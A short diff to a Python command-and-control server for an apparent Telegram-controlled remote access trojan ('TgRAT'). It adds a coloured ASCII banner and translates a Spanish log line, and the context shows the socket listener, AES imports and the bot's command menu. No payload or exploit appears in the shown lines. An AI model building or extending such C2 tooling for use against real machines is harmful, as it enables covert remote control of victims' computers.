@@ -7,6 +7,7 @@ import time
 import base64
 import requests
 import os
+from termcolor import colored
 from dotenv import load_dotenv
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -20,6 +21,17 @@ C2_CHANNEL_ID = os.getenv("CHAT_ID")
 C2_SERVER_IP = "0.0.0.0"
 C2_SERVER_PORT = 9090
 bot = telebot.TeleBot(TOKEN)
+
+banner = colored(r"""
+  ______      ____  ___  ______
+ /_  __/___ _/ __ \/   |/_  __/
+  / / / __ `/ /_/ / /| | / /   
+ / / / /_/ / _, _/ ___ |/ /    
+/_/  \__, /_/ |_/_/  |_/_/     
+    /____/     
+
+By tay
+""", 'blue')
 
 class ClientSession:
 
@@ -72,7 +84,8 @@ class C2Server:
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server.bind((C2_SERVER_IP, C2_SERVER_PORT))
         self.server.listen(5)
-        print(f"[C2] Servidor esperando conexiones en {C2_SERVER_IP}:{C2_SERVER_PORT}...")
+        print(banner)
+        print(colored(f"[C2] Server listening for connections in {C2_SERVER_IP}:{C2_SERVER_PORT}...", 'blue'))
         bot.send_message(C2_CHANNEL_ID, f"🚀 C2 Server Started at {C2_SERVER_IP}:{C2_SERVER_PORT} 🚀\n\n" 
                     f"ℹ️ *Global Commands* ℹ️\n"
                     f"- */shutdown* - Shut down server\n"
